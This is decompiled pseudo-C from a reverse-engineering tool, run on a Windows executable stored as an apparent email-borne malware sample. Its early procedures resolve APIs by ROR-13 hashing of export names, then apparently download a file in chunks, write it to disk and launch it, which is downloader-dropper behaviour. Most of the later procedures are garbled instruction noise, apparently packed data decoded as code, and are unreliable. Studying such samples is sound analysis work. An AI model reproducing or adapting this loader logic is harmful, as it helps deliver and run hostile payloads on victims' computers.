/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0004/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401094 - 0x00401112
 *	Argument size: -8
 *	Local size: 12
 *	Save regs size: 0
 */

L00401094(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff8 = 0;
    eax = *( *(edi + 60) + edi + 120) + edi;
    ecx = *(eax + 32);
    edx = *(eax + 36) + edi;
    (save)ebx;
    ecx = ecx + edi;
    (save)esi;
    Vfffffff4 = edx;
    if(*(eax + 24) > 0) {
        do {
            Vfffffffc = 0;
            esi = *ecx + edi;
            bl = *esi;
            if(bl != 0) {
                do {
                    edx = Vfffffffc;
                    ebx = bl;
                    asm("rol edx,0xd");
                    edx = edx ^ ebx;
                    esi = esi + 1;
                    bl = *esi;
                    Vfffffffc = edx;
                } while(bl != 0);
                edx = Vfffffff4;
            }
            if(Vfffffffc == A8) {
                goto L00401103;
            }
            Vfffffff8 = Vfffffff8 + 1;
            ecx = ecx + 4;
            edx = edx + 1 + 1;
            Vfffffff4 = edx;
        } while(Vfffffff8 < *(eax + 24));
    }
    eax = 0;
L004010ff:
    (restore)esi;
    (restore)ebx;
    return;
L00401103:
    ecx = *edx & 65535;
    eax = *( *(eax + 28) + ecx * 4 + edi) + edi;
    goto L004010ff;
}

/*	Procedure: 0x00401113 - 0x00401175
 *	Argument size: -8
 *	Local size: 12
 *	Save regs size: 0
 */

L00401113(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff8 = 0;
    eax = *( *(esi + 60) + esi + 120) + esi;
    ecx = *(eax + 32);
    eax = *(eax + 24);
    (save)ebx;
    ecx = ecx + esi;
    (save)edi;
    Vfffffff4 = eax;
    if(eax > 0) {
        do {
            eax = *ecx + esi;
            Vfffffffc = 0;
            dl = *eax;
            for(edi = eax; dl != 0; Vfffffffc = ebx) {
                ebx = Vfffffffc;
                edx = dl;
                asm("rol ebx,0xd");
                ebx = ebx ^ edx;
                edi = edi + 1;
                dl = *edi;
            }
            if(Vfffffffc == A8) {
                goto L00401172;
            }
            Vfffffff8 = Vfffffff8 + 1;
            ecx = ecx + 4;
        } while(Vfffffff8 < Vfffffff4);
    }
    eax = 0;
L00401172:
    (restore)edi;
    (restore)ebx;
}

stack space not deallocated on return
/*	Procedure: 0x00401176 - 0x00401611
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401176(A10)
/* unknown */ void  A10;
{
	/* unknown */ void  Vffffffac;



    (save)ebx;
    (save)esi;
    (save)edi;
    edi = A10;
    (save)5636;
    (save)64;
    eax = *(edi + 12)();
    esi = eax;
    ebx = 0;
    eax = edi + 1096;
    *(esi + 5040) = 0;
    if(*eax != 110 && *(edi + 1097) != 111 && *(edi + 1098) != 110 && *(edi + 1099) != 101) {
        (save)eax;
        eax = *(edi + 44)();
    }
    eax = edi + 52;
    (save)eax;
    eax = *edi();
    *(esi + 56) = eax;
    eax = edi + 64;
    (save)eax;
    eax = *edi();
    *(esi + 60) = eax;
    if(*(esi + 56) == ebx) {
        (save)ebx;
        (save)ebx;
        eax = edi + 52;
        (save)eax;
        eax = *(edi + 4)();
        *(esi + 56) = eax;
    }
    if(*(esi + 60) == ebx) {
        (save)ebx;
        (save)ebx;
        eax = edi + 64;
        (save)eax;
        eax = *(edi + 4)();
        *(esi + 60) = eax;
    }
    eax = *(esi + 56);
    if(eax != ebx && *(esi + 60) != ebx) {
        (save)edi + 74;
        (save)eax;
        eax = *(edi + 8)();
        *esi = eax;
        eax = edi + 88;
        (save)eax;
        (save) *(esi + 56);
        eax = *(edi + 8)();
        *(esi + 4) = eax;
        eax = edi + 105;
        (save)eax;
        (save) *(esi + 56);
        eax = *(edi + 8)();
        *(esi + 8) = eax;
        eax = edi + 122;
        (save)eax;
        (save) *(esi + 56);
        eax = *(edi + 8)();
        *(esi + 12) = eax;
        eax = edi + 139;
        (save)eax;
        (save) *(esi + 56);
        eax = *(edi + 8)();
        *(esi + 16) = eax;
        eax = edi + 166;
        (save)eax;
        (save) *(esi + 56);
        eax = *(edi + 8)();
        *(esi + 20) = eax;
        eax = edi + 183;
        (save)eax;
        (save) *(esi + 56);
        eax = *(edi + 8)();
        *(esi + 24) = eax;
        eax = edi + 203;
        (save)eax;
        (save) *(esi + 60);
        eax = *(edi + 8)();
        *(esi + 28) = eax;
        eax = edi + 218;
        (save)eax;
        (save) *(esi + 60);
        eax = *(edi + 8)();
        *(esi + 32) = eax;
        eax = edi + 239;
        (save)eax;
        (save) *(esi + 60);
        eax = *(edi + 8)();
        *(esi + 36) = eax;
        eax = edi + 256;
        (save)eax;
        (save) *(esi + 60);
        eax = *(edi + 8)();
        for(*(esi + 40) = eax; 1; *(edi + 36)()) {
            eax = esi + 164;
            (save)eax;
            (save)ebx;
            eax = edi + 271;
            (save)eax;
            (save)edi + 836;
            eax = *(edi + 40)();
            *(esi + 5044) = ebx;
            if(*(edi + 1400) != ebx) {
                (save)2;
                (save)ebx;
                *(esi + 28)();
                if(eax >= 0) {
                    (save)ebx;
                    (save)ebx;
                    (save)ebx;
                    (save)3;
                    (save)2;
                    (save)ebx;
                    (save)ebx;
                    (save)-1;
                    (save)ebx;
                    eax = *(esi + 32)();
                    eax = esi + 5628;
                    (save)eax;
                    eax = edi + 1384;
                    (save)eax;
                    (save)4;
                    (save)ebx;
                    eax = edi + 1368;
                    (save)eax;
                    eax = *(esi + 36)();
                    if(eax >= 0) {
                        eax = *(esi + 5628);
                        edx = *eax;
                        ecx = esi + 5632;
                        (save)ecx;
                        ecx = esi + 5608;
                        (save)ecx;
                        (save)ebx;
                        (save)edi + 1360;
                        (save)eax;
                        eax = *(edx + 12)();
                        if(eax >= 0) {
                            (save)520;
                            eax = esi + 424;
                            (save)eax;
                            (save)-1;
                            (save)esi + 164;
                            (save)ebx;
                            (save)ebx;
                            eax = *(edi + 48)();
                            (save)560;
                            eax = esi + 5048;
                            (save)eax;
                            (save)-1;
                            (save)edi + 556;
                            (save)ebx;
                            (save)ebx;
                            eax = *(edi + 48)();
                            eax = *(esi + 5632);
                            edx = *eax;
                            ecx = esi + 424;
                            (save)ecx;
                            (save)esi + 5048;
                            (save)eax;
                            eax = *(edx + 16)();
                            if(eax >= 0) {
                                eax = *(esi + 5632);
                                ecx = *eax;
                                (save)eax;
                                eax = *(ecx + 28)();
                                if(eax >= 0) {
                                    while(1) {
                                        eax = *(esi + 5632);
                                        edx = *eax;
                                        (save)esi + 5624;
                                        (save)eax;
                                        eax = *(edx + 56)();
                                        if(eax < 0) {
                                            break;
                                        }
                                        ecx = *(esi + 5624);
                                        if(ecx != 1 && ecx != 2) {
                                            goto L004013cd;
                                        }
                                        (save)100;
                                        eax = *(edi + 36)();
                                    }
                                    goto L004013cb;
L004013cd:
                                    if(ecx == 6) {
                                        ecx = *( *(esi + 5632));
                                        (save)eax;
                                        eax = *(ecx + 36)();
                                        *(esi + 5044) = 1;
                                        goto L004013e8;
L004013cb:
                                    }
                                }
                            }
L004013e8:
                            ecx = *( *(esi + 5632));
                            (save)eax;
                            eax = *(ecx + 32)();
                            ecx = *( *(esi + 5632));
                            (save)eax;
                            eax = *(ecx + 8)();
                        }
                        (save)eax;
                        *( *( *(esi + 5628)) + 8)();
                    }
                    eax = *(esi + 40)();
                }
                if(*(esi + 5044) != ebx) {
                    goto L00401521;
                }
            }
            (save)ebx;
            (save)128;
            (save)2;
            (save)ebx;
            (save)1;
            (save)1073741824;
            eax = esi + 164;
            (save)eax;
            *(edi + 1400) = ebx;
            eax = *(edi + 20)();
            *(esi + 64) = eax;
            if(eax != -1) {
                (save)ebx;
                (save)ebx;
                (save)ebx;
                (save)ebx;
                eax = edi + 271;
                (save)eax;
                eax = *esi();
                *(esi + 44) = eax;
                if(eax != ebx) {
                    ecx = *(edi + 552) & 65535;
                    (save)ebx;
                    (save)ebx;
                    (save)3;
                    (save)ebx;
                    (save)ebx;
                    (save)ecx;
                    (save)edi + 279;
                    (save)eax;
                    eax = *(esi + 4)();
                    *(esi + 48) = eax;
                    if(eax != ebx) {
                        (save)ebx;
                        (save)-2147483392;
                        (save)ebx;
                        (save)ebx;
                        (save)ebx;
                        (save)edi + 407;
                        (save)ebx;
                        (save)eax;
                        eax = *(esi + 8)();
                        *(esi + 52) = eax;
                        if(eax != ebx) {
                            (save)ebx;
                            (save)ebx;
                            (save)ebx;
                            (save)ebx;
                            (save)eax;
                            eax = *(esi + 12)();
                            if(eax != 0) {
                                while(1) {
                                    (save)ebx;
                                    (save)ebx;
                                    (save)esi + 68;
                                    (save) *(esi + 52);
                                    *(esi + 16)();
                                    if(*(esi + 68) == ebx) {
                                        break;
                                    }
                                    ecx = *(esi + 68);
                                    eax = 4096;
                                    if(ecx < 4096) {
                                        eax = ecx;
                                    }
                                    (save)esi + 72;
                                    (save)eax;
                                    eax = esi + 944;
                                    (save)eax;
                                    (save) *(esi + 52);
                                    eax = *(esi + 20)();
                                    if(eax == 0) {
                                        goto L00401501;
                                    }
                                    (save)ebx;
                                    eax = esi + 76;
                                    (save)eax;
                                    (save) *(esi + 72);
                                    (save)esi + 944;
                                    (save) *(esi + 64);
                                    eax = *(edi + 24)();
                                }
                                *(esi + 5044) = 1;
                            }
L00401501:
                            (save) *(esi + 52);
                            *(esi + 24)();
                        }
                        (save) *(esi + 48);
                        *(esi + 24)();
                    }
                    (save) *(esi + 44);
                    *(esi + 24)();
                }
                (save) *(esi + 64);
                eax = *(edi + 28)();
            }
            if(*(esi + 5044) == ebx) {
                *(edi + 1400) = 1;
            } else {
L00401521:
                if(*(esi + 5040) == ebx) {
                    *(esi + 5040) = 1;
                }
                (save)esi + 148;
                eax = esi + 80;
                (save)eax;
                (save)ebx;
                (save)ebx;
                (save)ebx;
                (save)ebx;
                (save)ebx;
                *eax = 68;
                (save)ebx;
                (save)esi + 164;
                (save)ebx;
                *(edi + 32)();
            }
            (save) *(edi + 1356);
        }
    }
    eax = *(edi + 16)(ebx);
L00401573:
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    return;
    (save)ebp;
    ebp = esp;
    esp = esp & -8;
    esp = esp - 3076;
    (save)ebx;
    (save)esi;
    (save)edi;
    eax = eax;
    ebx = ebx;
    asm("xlatb");
    asm("cmc");
    asm("adc cl,dh");
    edx = edx + 1;
    asm("outsd");
    asm("arpl [ecx-0x11],ax");
    al = al & 126;
    asm("out dx,al");
    ebp = ebp + *(edi + 39);
    (restore)edx;
    *LAC4F5CCB = eax;
    (save)eax;
    esp = esp ^ esi;
    eax = eax + *(eax + 61);
    asm("sbb [edx],dh");
    return;
    asm("sbb [edi+0x110819e2],cl");
    eax & -1028058430;
    (save)ebx;
    asm("%d push esi");
    asm("clc");
    asm("das");
    asm("adc [edi+0x13],eax");
    (save)edx;
    *(edx - 109) = *(edx - 109) - ch;
    asm("cwde");
    ebx = -102511914;
    asm("salc");
    asm("Unknown opcode 0x8f");
L004015d3:
    asm("cld");
    al = al + 37;
    ah = 248;
    if(esp = esp | *(bp + si + 11113)) {
        goto L00401573;
    }
    cl = cl - 248;
    edi = edi & Vffffffac;
    al = 171;
    asm("adc [ebp-0x56],ebp");
    if(al == 234) {
        goto L004015d3;
    }
    (save)esi;
    dh = dh - *L3CC7F4A8;
    *eax = *eax | edi;
    *L8F36F1E4 = al;
    asm("sahf");
    ecx = 1382852575;
    asm("Unknown opcode 0xc7");
    (fsave)(frestore) / *bx;
    asm("%g lodsb");
    esi = 2117370767;
    esp :: *(ebp - 12);
    asm("xchg eax,edi");
    asm("iret");
}

stack space not deallocated on return
/*	Procedure: 0x00401612 - 0x0040196D
 *	Argument size: 30016
 *	Local size: 0
 *	Save regs size: 0
 */

L00401612()
{



    asm("repne neg byte [edi+0x7f]");
    asm("pusha");
    edi = edi + 1;
    (restore)esp;
    asm("jpo 0x40161b");
    ebp = ebp + 1;
    eax = eax + -1579958209;
    ecx = 459278734;
    (restore)esi;
    *(ebx + 1365675194) = *(ebx + 1365675194) + 459278734;
    asm("%s xlatb");
    (save)eax;
    (save)ecx;
    asm("sbb esp,esp");
    (restore)ebx;
    asm("jpe 0x4016a8");
    al = al ^ 44;
    (restore)ebp;
    esi = esi + 1;
    (restore)ss;
    *(ebx + -783592922) :: al;
    asm("xchg eax,esi");
    asm("xchg edx,eax");
    asm("in eax,dx");
L00401645:
    asm("int1");
    eax = *eax;
    *(ebx + -581760574) = -1089869716;
    *(esi - 81) = *(esi - 81) | esi;
    (restore)ebp;
    (save)dx;
    asm("aad 0x29");
    asm("outsb");
    asm("scasd");
    ah = ah + *(eax + -72082354);
    (restore)ebp;
    edx = -1653601112;
    ebp = ebp & 1290624379;
    asm("sbb eax,edx");
    asm("fucomp st7");
    (restore)ebx;
    asm("Unknown opcode 0xfe");
    eax = *LEFC22040;
L00401679:
    if(edx = edx + 1) {
        goto L00401645;
    }
    al = 222;
    222 :: -1744082326;
    asm("salc");
    if(bl = bl + *(edx - 82)) {
        goto L00401679;
    }
    eax = eax << cl;
    asm("xchg eax,ebp");
    asm("frstor [edi]");
    asm("pusha");
    (restore)ebx;
    >= ? 0x40166b : ;
    *(esi - 116) = *(esi - 116) << cl;
    > ? L00401689 : ;
    asm("stc");
    eax = eax - 1;
    asm("clc");
    asm("adc dl,cl");
    eax = eax ^ 1318105769;
    asm("%e test al,0xaf");
    asm("cmpsd");
    esp = 444114080;
    (save)ebx;
    asm("cld");
    -39 = *esi * esi;
    bl = 169;
    asm("xchg dh,[ebx+0x52131cfd]");
    esp & esi;
    asm("xchg eax,ebp");
    es = *esi;
    asm("a16 insb");
    edx = edx + 1;
    (save)ds;
    asm("lock in eax,0xec");
    asm("clc");
    asm("xlatb");
    (restore)es;
    (save)ecx + -1625279902;
    if(!(al & 167)) {
        (save)ebx;
        *(esi - 45) = (frestore);
        asm("in al,0xb5");
    }
    asm("enter 0x2cfd,0x1");
    return;
    asm("Unknown opcode 0x82");
    esp = esp & *(eax + 24);
    asm("insd");
    asm("Unknown opcode 0xc5");
    asm("ficom word [ebx+0x33b4dc70]");
    asm("wait");
    asm("sbb eax,0xa0801898");
    asm("Unknown opcode 0x82");
    ebp = ebp + 1;
    esp = esp ^ *edx;
    eax = eax - 1692602894;
    asm("cmpsb");
    asm("out dx,eax");
    (restore)eax;
    eax = *L17E86BB4;
    asm("fucomi st4");
    *L9BF07745 = al;
    *(edx + 3766408) = *(edx + 3766408) - ebp;
    asm("Unknown opcode 0x8d");
    asm("int1");
    al = 72;
    asm("ror byte [esi+0x1c6e8ce6],1");
    asm("hlt");
    asm("in al,dx");
    *(eax + 1181962274) = *(eax + 1181962274) + dh;
    asm("popa");
    asm("sbb eax,[ecx+0x786dbbc6]");
    asm("rep jpe 0x4016c5");
    goto L00001a34;
    (save)-2076426593;
    asm("cld");
    asm("scasd");
    (save)es;
    asm("out 0x9,al");
L00401739:
    (save)edx;
    asm("retf");
    if(!(edi = edi + 1)) {
        asm("cld");
        asm("int 0x4c");
        asm("cmc");
        bh = 192;
        asm("xchg eax,edx");
        *(eax + 49) = *(eax + 49) ^ eax;
        bh = bh & *ecx;
        *edi = ebx;
        asm("adc edx,ebx");
        *(edi + -1931499783) = *(edi + -1931499783) + 241;
        asm("rcr dword [ebp+0x6b979994],cl");
        al = al ^ 29;
        asm("sbb ebp,ebp");
        asm("pushf");
        asm("jpe 0x401739");
        asm("into");
        asm("cmc");
        return;
        esi = esi & *(edi - 124);
        asm("aas");
        return(eax + -2135465137);
        asm("out 0x81,al");
        ebp = 1921357362;
    }
    asm("stc");
    asm("stc");
    eax = eax + 944495804;
    L000047d5();
    asm("cmpsb");
    asm("cdq");
    if(!(ebx = ebx - 1)) {
        asm("fidivr word [esi+0x9bc997fc]");
        al = *esi;
        esi = esi + 1;
        eax = eax - *ebx;
        ebp = ebp & *(ecx + 1386648693);
        (restore)ecx;
        eax = eax | *(ecx + ecx + 378074870);
        asm("insb");
        *edi = *esi;
        edi = edi + 1;
        al = al ^ *(eax + esi);
        asm("Unknown opcode 0xc7");
        if(esi = esi + 1) {
            goto L00401739;
        }
        al = 233;
        asm("retf 0x7172");
        (restore)ds;
        esp = ebp;
        (restore)ebp;
        asm("sbb [eax+0x7b566048],bh");
        asm("in eax,dx");
        eax = al - 38 - 1;
        asm("Unknown opcode 0xc5");
        asm("in eax,0x27");
        dl = dl - *(eax - 54);
        asm("fisubr dword [edx]");
        esp = esp - 1;
        asm("insb");
        al = *esi;
        esi = esi + 1;
        al :: 187;
        eax = eax ^ *(edi - 66);
        eax :: -922455669;
        esi = 47094777;
        cl = 107;
        al = al + 183;
        asm("imul ah");
        *esi = (frestore);
        *ebx :: esp;
        al = al + 111;
        asm("aas");
        ebp = ebp + 1;
        asm("sbb eax,0xf207a55");
L004017e6:
        asm("cmpsb");
        eax = eax & *(ecx - 104);
    }
L004017ef:
    asm("adc eax,0x93789659");
    asm("in eax,dx");
    bl = 154;
    (save)ss;
    asm("rcr dword [edi+0x27aa3199],cl");
    edx = edx ^ -552322117;
    if(*(edi + 1636346158) = *(edi + 1636346158) & cl) {
        goto L004017e6;
    }
    asm("in eax,0x76");
    asm("Unknown opcode 0x8f");
    asm("Unknown opcode 0x8f");
    asm("wait");
    asm("jecxz 0x40185b");
    bh = 88;
    al = al + 178;
    asm("lds ebx,[eax+0x10]");
    asm("fnstsw [edi+0x9c4c7783]");
    esp = esp + *(ecx + 1114665154);
    ecx = ecx + 1;
    asm("sbb al,0x4b");
    asm("aaa");
    asm("pusha");
    asm("xchg eax,esp");
    if(*(ebp + -1635550752) >= eax) {
        goto L004017ef;
    }
    *(ebp + -806350003) :: ch;
    esi = esi - 1;
    esp = esp - 1;
    asm("daa");
    asm("%e retf");
    asm("iret");
    asm("loopne 0x401861");
L0040183d:
    *edi = *esi;
    edi = edi + 1;
    asm("bound edi,[eax+0x37]");
    asm("rcl byte [si],cl");
    bl = 83;
    asm("xchg eax,edi");
    asm("popa");
    if(esi = esi + 1) {
        goto L0040183d;
    }
    al = *esi;
    esi = esi + 1;
    asm("rol dl,0x38");
    (restore)ds;
    esp = ebp - 1;
    (restore)ebp;
    (restore)ecx;
    al = dh - 127;
    *(ebp - 103) = *(ebp - 103) >> 1;
    asm("repne jpe 0x4017e0");
    (fsave) *L1D156480;
    1459628982 = eax * eax;
    asm("xchg eax,ebp");
    edi = -1431006985;
    asm("xchg eax,esp");
    *(edx + 15) = dl;
    (restore)ss;
    asm("cdq");
    eax :: edx;
    asm("rol byte [ecx],cl");
    (save)-1;
    asm("%e xchg eax,ecx");
    al :: 119;
    (restore)ds;
    asm("o16 cmp [edi],al");
    asm("xchg eax,ebp");
    if(!(esp = esp + 1)) {
        asm("Unknown opcode 0xc7");
        asm("outsb");
        -1896356666 = *(ebp + 33) * edi;
        asm("clc");
        asm("clc");
        *(esp + eax * 4 + 59) = *(esp + eax * 4 + 59) | bh;
        asm("Unknown opcode 0xdd");
        asm("cld");
        asm("o16 fldenv [ecx]");
        cl = 231;
        ah :: bl;
        bh = 21;
        edi = -1979431691;
L004018ac:
        asm("adc byte [edi+0x2b728a9f],0xeb");
        edi = 1822128378;
        if(eax = *LEF4A53EE + -1149948948) {
            goto L004018ac;
        }
        (save)eax;
        asm("das");
        asm("aad 0x21");
        asm("stc");
        asm("Unknown opcode 0x82");
        asm("%s sbb al,0x8e");
    }
    asm("sbb eax,0x7058812d");
    (save)edi;
    asm("out dx,eax");
    asm("cdq");
    eax = -1652165095;
    asm("sbb esi,[ebx]");
    (restore)ds;
    (save)esp;
    asm("lock mov edx,0x765857d6");
    *(eax + esi * 8 + 28) = *(eax + esi * 8 + 28) ^ ebx;
    edi = edi - 1;
    (restore)ds;
    (restore)ecx;
    esp = esp - eax;
    al :: *ecx;
    *edi = eax;
    edi = edi + 4;
    asm("das");
    asm("punpcklwd mm4,mm7");
    bl = 52;
    if(al == *edi) {
        *L009DC27B = eax;
        asm("ror byte [esi],cl");
        (restore)eax;
        asm("fucom st1");
        asm("in eax,0x74");
        if(!(bl = 52 & dl)) {
            asm("pusha");
            asm("fidivr word [%fs:esp+esi*2]");
            ecx = ecx + 1;
            ecx = 1396842941;
            ecx = *edx;
            *edi = *esi;
            edi = edi + 4;
            ecx = ecx | esi + 4;
            edi :: eax;
            (restore)esi;
            asm("rep jpe 0x40190f");
            asm("%s salc");
            esp = ebp;
            (restore)ebp;
            (restore)edi;
            dl = 189;
            eax = *LD14A33EC;
        }
        asm("lock jmp short 0x4018be");
        bh = 4;
        asm("das");
        *LB73B44D3 = al;
    }
    *L7B923D8D = al;
    asm("clc");
    tword [ebp+0x2c3c2c99] = (frestore);
    ds = esp;
    eax = eax ^ -1770444052;
    asm("xchg eax,esp");
    (save)eax;
    asm("xchg eax,ebp");
    asm("xchg dl,[esp+ecx*4]");
L00401948:
    asm("cwde");
    if(eax = eax & 1132509162) {
        goto L00401948;
    }
    *(ebp + -341542617) = *(ebp + -341542617) - 1;
    asm("adc dl,[0xd1530413]");
    al = *LE0F78F1B;
    asm("out dx,eax");
    (restore)edx;
    *(ebx + -1787163655) = *(ebx + -1787163655) - 231;
    asm("into");
}

stack space not deallocated on return
/*	Procedure: 0x0040196E - 0x00401CF4
 *	Argument size: 16064
 *	Local size: 0
 *	Save regs size: 0
 */

L0040196E()
{



    (save)ss;
    asm("fdivr dword [eax]");
    asm("enter 0xb5ac,0xfb");
    asm("int 0x8c");
    ch = ch | *(esi - 54);
    if(!( *(ebx + 42) = *(ebx + 42) & eax)) {
        asm("sbb eax,0xe03c27cb");
        asm("xchg eax,ecx");
        *(ecx + -299245716) = dl;
        asm("ror dword [edx+0x168f87c2],0xa");
        asm("fsubr dword [edi+0x32]");
        asm("popf");
        asm("rep adc ah,[esp+edx+0x33]");
        bh = *edi;
        asm("sbb dh,ah");
        asm("into");
        != ? 0x401a02 : ;
        *(edx + -1627903511) = *(edx + -1627903511) / *(edx + -1627903511);
        edx = *(edx + -1627903511) % *(edx + -1627903511);
        *edi = *esi;
        edi = edi + 1;
        esi = esi + 1;
        return;
        asm("sti");
        al = al + 108;
L004019af:
        eax = eax - -2029451519;
    }
    asm("sahf");
    ah :: 0;
    asm("rcl dword [ebx-0x24],0x7b");
    if(!(al = al - 57)) {
        == ? L00401a2f : ;
        al = al & 121;
        asm("adc dword [eax],-0x1");
        asm("lahf");
        asm("les eax,[edi]");
        ebx = ebx + 1;
        *L89E7D7E1 = al;
        eax = (al - 98 & -1882494594) - -1250540547 - -1679739446;
        (save)ecx;
        asm("pusha");
        bh = 134;
        edi = 1704908092;
        if(*(ebx + esi * 4) = *(ebx + esi * 4) | bl) {
            goto L004019af;
        }
        asm("jpo 0x401a3b");
        goto L00007459;
        asm("int 0x86");
        asm("retf");
        > ? L0040199d : ;
        *edi = *esi;
        edi = edi + 1;
        esi = esi + 1;
        (save)es;
        asm("pusha");
        if(al = al & 82) {
            goto L00401a2f;
        }
        return;
        asm("jecxz 0x401a1b");
        asm("hlt");
        ecx = ecx | *eax;
        asm("aaa");
        asm("retf");
        (save)ss;
        (save)ds;
        asm("cdq");
        eax = eax | -2134104574;
        *(ecx + 4) = *(ecx + 4) & ebx;
        ebx = ebx + 1;
        edx = -1962849334;
        asm("scasb");
        asm("enter 0xa109,0x57");
        esi = esi + 1;
        cl = cl + dl;
    }
    *eax = *eax - cl;
    (save)ss;
    cl = cl + *(ebx + -865922456);
L00401a2f:
    asm("xchg eax,edx");
    bh & al;
    asm("aam 0xb2");
    eax & -1880923757;
    asm("in al,dx");
    esi = esi + eax;
L00401a3d:
    ebx = ebx | edi;
    asm("jpo 0x401aa8");
    asm("xchg eax,ebx");
    esp = -967327704;
    ch :: 0;
    *L8D58EB3C & esi;
    al = al & 119;
    edx = edx - 1;
    asm("xchg cl,[ecx]");
    asm("%f in eax,dx");
    asm("rcl edi,1");
    asm("sbb bl,[eax+0xa1306dab]");
    asm("arpl [eax],cx");
    asm("a16 push cs");
    ah = ah >> 1;
    (save)cs;
    *L83021987 = al;
    edx = -1544606422;
    cl = 11;
    asm("sbb eax,0x2f283002");
    asm("xlatb");
    *edi = *esi;
    edi = edi + 1;
    esi = esi + 1;
    *edi = eax;
    edi = edi + 4;
    al & 151;
    asm("sbb eax,0xffb3337a");
    eax = eax - -327624686;
    al = *L9DE72F38;
    asm("int 0xd");
    asm("Unknown opcode 0xd2");
    edx = *(esi + 633027364) % *(esi + 633027364);
    (fsave)(frestore) + *(edi + ecx * 8 - 112) - *(edx + 30057502);
    asm("hlt");
    ecx = ecx ^ *eax;
    if(*(esi + 633027364) = *(esi + 633027364) / *(esi + 633027364)) {
        goto L00401a3d;
    }
    *edi = eax;
    edi = edi + 4;
    asm("pusha");
    L0000124d();
    *(edx + 97) = *(edx + 97) + 1;
    (restore)edi;
    asm("enter 0xf0e1,0xae");
    asm("sti");
    *(esi + -1844291298) = !( *(esi + -1844291298));
L00401abc:
    asm("loopne 0x401b36");
    asm("mul byte [ebp+0x56]");
    asm("in al,0xc5");
    esp :: 0;
    asm("retf 0x297d");
    *(edx + 1201502084) = *(edx + 1201502084) - bh;
    *edi = *esi;
    edi = edi + 1;
    esi = esi + 1;
    asm("pusha");
    *(ecx + 220990074) & esi;
    eax = eax - -1701794426;
    *(ecx - 93) = *(ecx - 93) >> 1;
    ch = ch - dl;
L00401adf:
    al = al | 71;
    asm("Unknown opcode 0x8e");
    ecx = ecx - 1;
    goto L00401adf;
    if(!(ecx = ecx | esp)) {
        asm("insd");
        asm("cmpsb");
        asm("aaa");
        (save)es;
        *(eax + 58) = *(eax + 58) << cl;
    }
    if(!(eax = eax - 1)) {
        asm("sbb al,0xff");
        asm("aad 0xa2");
        asm("clc");
        asm("cwde");
        al = al + 99;
        asm("cdq");
        edi = eax;
        if(edi = ebp + 92) {
            goto L00401abc;
        }
        asm("sbb [edx+0xe806a540],edx");
        asm("aaa");
        asm("pusha");
        >= ? L00401ad3 : ;
        asm("das");
        (save)-516974654;
        (save)ss;
        (save)esp;
        cl :: *(ecx - 2);
        si = si + 1;
        ds = eax;
        asm("cmpsd");
        (fsave) *(ecx + 121) + *eax;
        asm("sbb ebp,[ebx]");
        (restore)ebx;
        asm("sbb ah,cl");
        asm("%d std");
        edx = edx - 1;
        *esi = *esi ^ ch;
        asm("adc eax,0x2b9438c3");
        asm("lock pop ebp");
        (save)esp;
        asm("lds esi,[ebx+0xb98f3211]");
        if(ecx = ecx - 1) {
            goto L00401b9e;
        }
        asm("daa");
        esp = esp - 1;
        ch = ch | *(edx - 101);
        ah = 69;
        *L00000045 = cs;
        dl = dl - *(eax - 97);
    }
    asm("aad 0x1c");
    al = al - 37;
    asm("insd");
    *(ebx + -2079453910 + 1794101884) = *(ebx + -2079453910 + 1794101884) & ch;
    asm("fnstsw ax");
    edi = 1313471146;
    asm("imul byte [esp]");
    eax :: -504099096;
    asm("salc");
    asm("aam 0x96");
    asm("adc ecx,ebx");
    (save)esp;
    asm("out 0x46,al");
    asm("xchg ebp,esi");
    esp :: *(eax + 119);
    asm("std");
    edx = edx + 1;
    asm("Unknown opcode 0x8f");
    al = 128;
    goto L000056ba;
    -49 = *(ebp + 1199842398) * ebp;
    asm("popa");
    bh = 23;
    *LFFFFFFAB = es;
    asm("Unknown opcode 0x0f");
    asm("in al,dx");
    edx = edx + 1;
    al = *esi;
    esi = esi + 1;
    asm("outsd");
    esp :: *(esi + -658888766);
    esi = esi | ebp;
L00401b9e:
    *(eax - 44) = *(eax - 44) >> 1;
L00401ba1:
    dl = 41;
    (save)esi;
    *L2D953C04 = al;
    asm("insd");
    asm("int 0x8d");
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    asm("xchg eax,ebx");
    38 = edx * eax;
    asm("arpl sp,si");
    asm("scasb");
    asm("stc");
    al = al & dh;
    asm("das");
    asm("arpl di,si");
    asm("xchg eax,ecx");
    ah = ah & *(edx + 1253750464);
    *ebx = *ebx & dh;
    asm("adc ecx,[edx+0x88cb7cb0]");
    asm("adc [esi-0x58],dl");
    asm("loopne 0x401bf6");
    *(ebp - 79) :: esp;
    asm("aad 0x3f");
    if(al = al - 24) {
        goto L00401ba1;
    }
    (save)esp;
    al :: 104;
    (fsave)(frestore) - *esi;
    asm("out 0xb1,eax");
    (save)esp;
    asm("stc");
    asm("ror dword [ebp+0x168e193a],1");
    asm("stc");
    *edi = eax;
    edi = edi + 4;
    (save)ebp;
    *L50EC6155 = eax;
    asm("enter 0x47d0,0xb1");
    (save)esp;
    asm("%s push eax");
    eax = *LD49BDF2A;
    if(!( *(ecx + 97) = *(ecx + 97) & edi)) {
    }
    >= ? 0x401bc9 : ;
    asm("wait");
    al = al + 121;
    eax = L52db6bba();
L00401c0b:
    *(edi + ebx * 8 + 2695026) = *(edi + ebx * 8 + 2695026) + ch;
    edi = edi + 1;
    asm("adc ebx,[ebx-0x15]");
    asm("std");
    *%gs:esp+0x8a659d85] = *%gs:esp+0x8a659d85] >> 1;
    asm("int3");
    asm("retf 0x6328");
    if(!(ch = ch | al)) {
        asm("retf 0x1dbf");
        (save)esi;
        eax = eax & *ecx;
        asm("retf 0x84cd");
        esp = -1410459275;
L00401c34:
        asm("das");
        asm("jpe 0x401ca9");
        asm("fdivr st4");
        eax = L362f2fd8(ss);
        asm("fst qword [ebx+0x1a78f213]");
        return;
L00401c48:
        esp = esp | ebx;
        asm("xchg eax,esp");
        esp = esp - 1;
        asm("cmpsd");
        asm("lahf");
        asm("Unknown opcode 0xff");
        esp :: ecx;
